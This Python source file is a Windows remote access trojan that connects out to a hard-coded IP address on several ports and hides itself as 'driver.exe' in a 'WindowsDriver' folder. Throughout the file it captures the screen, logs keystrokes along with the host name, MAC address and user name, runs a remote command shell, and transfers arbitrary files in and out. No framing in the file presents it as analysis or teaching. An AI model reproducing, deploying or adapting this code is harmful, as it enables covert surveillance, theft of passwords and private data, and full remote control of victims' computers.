import ctypes
import datetime
import getpass
import glob
import os
import sys
import queue
import re
import socket
import threading
import time
import uuid
import pickle

import PIL
import pyautogui
from PIL import Image
from mss import mss
from pynput.keyboard import Listener
from subprocess import PIPE, Popen

# global cursor, status, payload_path, payload_info, payload_list, payload_list_pos

screen_cap_queue = queue.Queue()
key_log_queue = queue.Queue()
cursor = Image.new("RGB", (10, 10), "red")

## command centre
# Turn on/off, <colour&grayscale:monochrome:black&white> quality
status = {"screenCapture": [False, "color", 70],
# Send Live Key Strokes on/off
          "keyLog": False}

# payload receive
payload_path = ""
payload_info = ""
payload_list = []
payload_list_pos = 0

# payload send
payload_data = queue.Queue()

# permission to start thread
start_thread = True

#file path
homedir = os.path.expanduser("~")

try:
    is_admin = os.getuid() == 0
except AttributeError:
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0

if is_admin:
    base_dir = "C:\\Windows\\System32\\WindowsDriver\\"
else:
    base_dir = homedir + "\\AppData\\Local\\WindowsDriver\\"

application_name = "driver.exe"
final_path = base_dir + application_name

# global variables
ip = "218.212.116.194"
#ip = "192.168.10.122"


# TCP Connections
class TcpConnections:

    # receive
    def tcp_connection_command(self):
        global start_thread, ip

        try:
            port = 12345
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            while True:
                data = s.recv(1024)
                command = bytes.decode(data)
                command_centre(command)
        except Exception as error:
            reset()
            start_thread = True
            time.sleep(5)
            TcpConnections.tcp_connection_command(self=0)

    # send
    def tcp_connection_screenCap(self):
        global start_thread, ip

        try:
            port = 12346
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            while True:
                data = screen_cap_queue.get()
                if data == "terminate":
                    s.send(b'terminateend')
                    break
                end_header = bytes("end", "utf-8")
                s.send(data + end_header)
                s.recv(1024)
            s.close()
        except Exception as error:
            # print("screenCap")
            # print(error)
            pass

    # send
    def tcp_connection_keyLog(self):
        global ip

        try:
            port = 12347
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            while True:
                data = key_log_queue.get()
                if data == "terminate":
                    s.send(b'terminatechar')
                    break
                s.send(data)
            s.close()
        except Exception as error:
            # print("keyLog")
            # print(error)
            pass

    # receive
    def tcp_connection_remoteTerminal(self):
        global ip

        try:
            port = 12348
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            while True:
                command = bytes.decode(s.recv(2048), "utf-8")
                output = terminal(command)
                s.send(output)
        except Exception as error:
            # print("terminal")
            # print(error)
            pass

    # send/receive
    def tcp_connection_payload(self):
        global ip

        try:
            port = 12349
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            while True:
                result = "Incomplete"
                data = b''
                while result == "Incomplete":
                    data += s.recv(362144)
                    result = Payload.payload_receive(data)
                if result == b'~termin@te~`':
                    s.close()
                    break
                if result == "Send Package":
                    data = payload_data.get()
                    s.send(data)
                else:
                    s.send(bytes(result, "utf-8") + b'msg~`')
        except Exception as error:
            # print("payload")
            # print(error)
            pass


# Command Centre
def command_centre(command):
    global status, start_thread

    command = command.split("|")

    # Start To establish connection
    if command[0] == "start":
        start_thread = False

        p1 = threading.Thread(target=TcpConnections.tcp_connection_screenCap, args=(0,))
        p2 = threading.Thread(target=TcpConnections.tcp_connection_keyLog, args=(0,))
        p3 = threading.Thread(target=TcpConnections.tcp_connection_remoteTerminal, args=(0,))
        p4 = threading.Thread(target=TcpConnections.tcp_connection_payload, args=(0,))

        p1.start()
        p2.start()
        p3.start()
        p4.start()

    # Disconnect From Device
    if command[0] == "quit":
        start_thread = True
        reset()
        screen_cap_queue.put("terminate")
        key_log_queue.put("terminate")

    # reset programme
    elif command[0] == "reset":
        os.startfile(os.getcwd() + "/" + os.path.basename(sys.argv[0]))
        os.system('TASKKILL /F /PID ' + str(os.getpid()))

    # Screen Capture
    elif command[0] == "screenCap":
        if command[1] == "start":
            status["screenCapture"][0] = True

        elif command[1] == "stop":
            status["screenCapture"][0] = False

        elif command[1] == "type":
            status["screenCapture"][1] = command[2]

        elif command[1] == "quality":
            status["screenCapture"][2] = int(command[2])

    # Key Log
    elif command[0] == "keyLog":
        if command[1] == "start":
            status["keyLog"] = True

        elif command[1] == "stop":
            status["keyLog"] = False

        elif command[1] == "download":
            deliver()


# Retrieve Data
def retrieve(type1, type2):
    #Screen Capture
    if type1 == "screen":

        if type2 == "capture":
            data = status["screenCapture"][0]
        elif type2 == "type":
            data = status["screenCapture"][1]
        elif type2 == "quality":
            data = status["screenCapture"][2]

    #Key Logger
    elif type1 == "log":

        if type2 == "capture":
            data = status["keyLog"]
        # elif type2 == "download":
        #     data = status["keyLog"]

    return data


# Reset Data
def reset():
    global status, payload_path, payload_info, payload_list, payload_list_pos
    status = {"screenCapture": [False, "color", 70],
              "keyLog": False}

    payload_path = ""
    payload_info = ""
    payload_list = []
    payload_list_pos = 0

    screen_cap_queue.queue.clear()
    key_log_queue.queue.clear()
    payload_data.queue.clear()


# Screen Capture
def screen_cap():

    def screenshot():
        width, height = pyautogui.size()

        size_capture = {'top': 0, 'left': 0, 'width': width, 'height': height}
        sct = mss()
        sct_img = sct.grab(size_capture)
        sct_img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")

        return sct_img

    def combine(screenshot, cursor):
        xcor, ycor = pyautogui.position()
        width, height = pyautogui.size()
        quality = retrieve("screen", "quality")


        screenshot.paste(cursor, (xcor, ycor))

        screenshot = screenshot.resize((int(width / 2), int(height / 2)), PIL.Image.ANTIALIAS)

        if retrieve("screen", "type") == "color":
            pass
        elif retrieve("screen", "type") == "monochrome":
            screenshot = screenshot.convert('L')

        try:
            screenshot.save(base_dir + "shot1.jpg", quality=quality, optimize=True)
            content = open(base_dir + "shot1.jpg", 'rb')
        except:
            try:
                screenshot.save(base_dir + "shot2.jpg", quality=quality, optimize=True)
                content = open(base_dir + "shot2.jpg", 'rb')
            except:
                try:
                    screenshot.save(base_dir + "shot3.jpg", quality=quality, optimize=True)
                    content = open(base_dir + "shot3.jpg", 'rb')
                except:
                    pass
        try:
            img_data = content.read()
            screen_cap_queue.put(img_data)
        except:
            pass

    while True:  ### main engine of screen_cap() ###
        try:
            if retrieve("screen", "capture"):
                combine(screenshot(), cursor)
            else:
                time.sleep(5)
                screen_cap()
        except Exception as error:
            pass
            # print(error)


# Key Log
def key_log():
    global last_mem, shift, alt, caps_lock, start

    last_mem = " "
    shift = False
    alt = False
    start = True
    if (ctypes.WinDLL("User32.dll").GetKeyState(0x14) and 0xffff) != 0:
        caps_lock = 1
    else:
        caps_lock = 0

    def create_folder():
        try:
            os.mkdir(base_dir + "log")
        except Exception as error:
            # print("error 1")
            # print(error)
            pass


    ctrl = {"\\x01":"a", "\\x02":"b", "\\x03":"c", "\\x04":"d", "\\x05":"e", "\\x06":"f", "\\x07":"g", "\\x08":"h", "\\t":"i", "\\n":"j", "\\x0b":"k", "\\x0c":"l", "\\r":"m", "\\x0e":"n",
            "\\x0f":"o", "\\x10":"p", "\\x11":"q", "\\x12":"r", "\\x13":"s", "\\x14":"t", "\\x15":"u", "\\x16":"v", "\\x17":"w", "\\x18":"x", "\\x19":"y","\\x1a":"z", "<48>":"0", "<49>":"1",
            "<50>":"2", "<51>":"3", "<52>":"4", "<53>":"5", "<54>":"6", "<55>":"7", "<56>":"8", "<57>":"9", "<192>":"`", "<189>":"-", "<187>":"=", "\\x1b":"[", "\\x1d":"]", "\\x1c":"\\",
            "<186>":";", "<222>":"'", "<188>":",", "<190>":".", "<191>":"/"}

    def press(key):
        key = format_press(key)
        if key != None:
            write_file(key)
            if retrieve("log", "capture"):
                send_char(key)

    def release(key):
        key = format_release(key)
        if key != None:
            write_file(key)
            if retrieve("log", "capture"):
                send_char(key)

    def write_file(key):
        try:
            log_name = datetime.datetime.now().strftime("%d-%m-%Y") + ".rxc"
            file = open(base_dir + "log\\" + log_name, "a")
            file.write(key)
            file.close()
        except Exception as error:
            # print("error 2")
            # print(error)
            create_folder()

    def send_char(key):
        data = bytes(key + "char", "utf-8")
        key_log_queue.put(data)

    def format_press(key):
        global last_mem, caps_lock, shift, alt, start
        key = str(key)

        if key != "Key.caps_lock":
            key = key.replace("'", "")
            if "Key." in key:
                if key == "Key.space":
                    key = " "
                elif key == "Key.enter":
                    time = datetime.datetime.now().strftime("%I:%M:%S %p :>>: ")
                    key = "[enter]\n" + time
                else:
                    key = key.replace("Key.", "<") + ">"
                    key = key.replace("_r", "")
                    key = key.replace("_gr", "")
                    key = key.replace("_l", "")

                if key == "<shift>":
                    key = "<shift[start]>"
                    shift = True
                elif key == "<alt>":
                    key = "<alt[start]>"
                    alt = True
                elif last_mem == "<shift[end]>":
                    shift = False
                elif last_mem == "<alt[end]>":
                    alt = False

                if last_mem[-1] == ">" and key == " ":
                    time = datetime.datetime.now().strftime("%I:%M:%S %p :>>: ")
                    key = "\n" + time + key

                elif key not in last_mem and key[:8] != "[enter]\n" and key != " " and last_mem[:8] != "[enter]\n":
                    time = datetime.datetime.now().strftime("%I:%M:%S %p :>>: ")
                    key = "\n" + time + key

            else:
                if ctrl.get(key) != None:
                    key = key.replace(key, "<" + ctrl.get(key) + ">")
                key = key.replace("\\\\", "\\")

                if caps_lock == 1 and len(key) == 1:
                    key = key.upper()

                if last_mem == "<shift[end]>":
                    shift = False
                elif last_mem == "<alt[end]>":
                    alt = False

                if "<" in last_mem and ">" in last_mem and len(key) == 1 and not shift and not alt:
                    time = datetime.datetime.now().strftime("%I:%M:%S %p :>>: ")
                    key = "\n" + time + key

            last_mem = key

            if start:
                date_time = datetime.datetime.now().strftime("%d-%m-%Y : %A <--> %I:%M:%S %p")
                hostname = socket.gethostname()
                mac_addr = re.findall('..', '%012x' % uuid.getnode())
                current_user = getpass.getuser()
                time = datetime.datetime.now().strftime("%I:%M:%S %p :>>: ")

                key = "\n<<<<<<<< Windows KeyLog started at >>>>>>>>\n" + date_time + "\n\nDevice Name: " + hostname + "\nMAC Address: " + ':'.join(mac_addr) + "\n\nCurrent User: " + current_user + "\n" + "-------------\n" * 30 + time + key
                start = False
            return key

        else:
            if caps_lock == 0:
                caps_lock += 1
            else:
                caps_lock = 0
            return None

    def format_release(key):
        global last_mem

        key = str(key)
        if key == "Key.shift" or key == "Key.shift_r":
            key = "<shift[end]>"
            last_mem = key
            return key
        elif key == "Key.alt_l" or key == "Key.alt_gr":
            key = "<alt[end]>"
            last_mem = key
            return key
        else:
            return None

    def file_boot():
        txtfiles = []
        for file in glob.glob("log\\*.rxc"):
            file = file.replace("log\\", "").replace(".rxc", "")
            txtfiles.append(file)
        if len(txtfiles) == 30:
            txtfiles.sort(key=lambda date: datetime.datetime.strptime(date, '%d-%m-%Y'))
            os.remove("log\\" + txtfiles[0] + ".rxc")

    create_folder()
    file_boot()
    with Listener(on_press=press, on_release=release) as listener:
        listener.join()


# keylog deliver
def deliver():
    for file in glob.glob(base_dir + "log\\*.rxc"):
        name = file.replace(base_dir + "log\\", "").replace(".rxc", "")

        content = open(file, "rb")
        data = content.read()

        data = bytes(name + "~~", "utf-8") + data + b'l~g`'
        key_log_queue.put(data)


# remote terminal
def terminal(command):
    if command == "\n" or command == "cls\n" or command == "exit\n":
        output = bytes(os.getcwd() + ">", "utf-8")
    elif command[:3] == "cd ":
        os.chdir(command[3:].replace("\n", ""))
        output = bytes("\n" + os.getcwd() + ">", "utf-8")
    else:
        cmd = Popen(command, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
        stdout, stderr = cmd.communicate()
        output = stdout + stderr + bytes("\n" + os.getcwd() + ">", "utf-8")
    return output


# Payload
class Payload:
    def payload_send(path):
        if os.path.exists(path):
            path_d = []
            for directory in os.walk(path):
                path_d.append(directory)

            if len(path_d) == 0:
                file_name = path.rsplit("\\", 1)[1]
                try:
                    content = open(path, "rb")
                    data = bytes(file_name + "?", "utf-8") + content.read() + b'dat~`'
                except:
                    data = bytes(file_name + "?", "utf-8") + b'Not Enough Permission' + b'dat~`'

                payload_data.put(data)

            else:
                payload_data_pickled = pickle.dumps(path_d) + b'inf~`'
                payload_data.put(payload_data_pickled)

                for loop1 in range(len(path_d)):
                    path_r, direc, file = path_d[loop1]

                    for all_files in file:
                        try:
                            content = open(path_r + "\\" + all_files, "rb")
                            data = bytes(all_files + "?", "utf-8") + content.read() + b'dat~`'
                        except:
                            data = bytes(all_files + "?", "utf-8") + b'Not Enough Permission' + b'dat~`'

                        payload_data.put(data)
            payload_data.put(b'finaldon~`')

            return "Send Package"
        else:
            return "Invalid Path"


    def payload_receive(data):
        global payload_path, payload_info, payload_list, payload_list_pos

        header_type = data[len(data) - 5:]
        content = data[:len(data) - 5]

        if data == b'~termin@te~`':
            return data

        elif header_type == b'pat~`':
            content = bytes.decode(content, "utf-8")
            if os.path.isdir(content):
                if not content.endswith("\\"):
                    content += "\\"
                payload_path = content
                payload_list = []
                payload_list_pos = 0
                return "Proceed Data"
            else:
                return "Invalid Path"

        elif header_type == b'inf~`':
            payload_info = pickle.loads(content)

            fake_path = payload_info[0][0]
            if fake_path.endswith("\\"):
                fake_path = fake_path.rsplit("\\", 1)[0]
            actual_path = payload_path + fake_path.rsplit("\\", 1)[1]

            def trial(path):
                try:
                    os.mkdir(path)
                except:
                    path += "_"
                    trial(path)
                return path
            actual_path = trial(actual_path)
            payload_path = actual_path

            for loop1 in range(len(payload_info)):
                path_r, direc, file = payload_info[loop1]
                if path_r.endswith("\\"):
                    path_r = path_r.rsplit("\\", 1)[0]
                path_r = path_r.replace(fake_path, actual_path)

                for loop2 in direc:
                    os.mkdir(path_r + "\\" + loop2)

                for loop3 in file:
                    payload_list.append(path_r + "\\" + loop3)

            return "Proceed"

        elif header_type == b'dat~`':
            try:
                data_cur = content.split(b'?', 1)[1]

                if len(payload_list) == 0:
                    file_name = bytes.decode(content.split(b'?', 1)[0], "utf-8")
                    path = payload_path + file_name
                else:
                    path = payload_list[payload_list_pos]
                    payload_list_pos += 1

                content = open(path, "wb")
                content.write(data_cur)
            except Exception as error:
                # print(error)
                pass

            return "Proceed"

        elif header_type == b'sen~`':
            path = bytes.decode(content, "utf-8")
            return Payload.payload_send(path)

        elif header_type == b'pro~`':
            return "Send Package"

        else:
            return "Incomplete"


if __name__ == '__main__':
    p1 = threading.Thread(target=TcpConnections.tcp_connection_command, args=(0,))

    p2 = threading.Thread(target=screen_cap)
    p3 = threading.Thread(target=screen_cap)
    p4 = threading.Thread(target=screen_cap)
    p5 = threading.Thread(target=screen_cap)

    p6 = threading.Thread(target=key_log)


    p1.start()
    p2.start()
    p3.start()
    p4.start()
    p5.start()
    p6.start()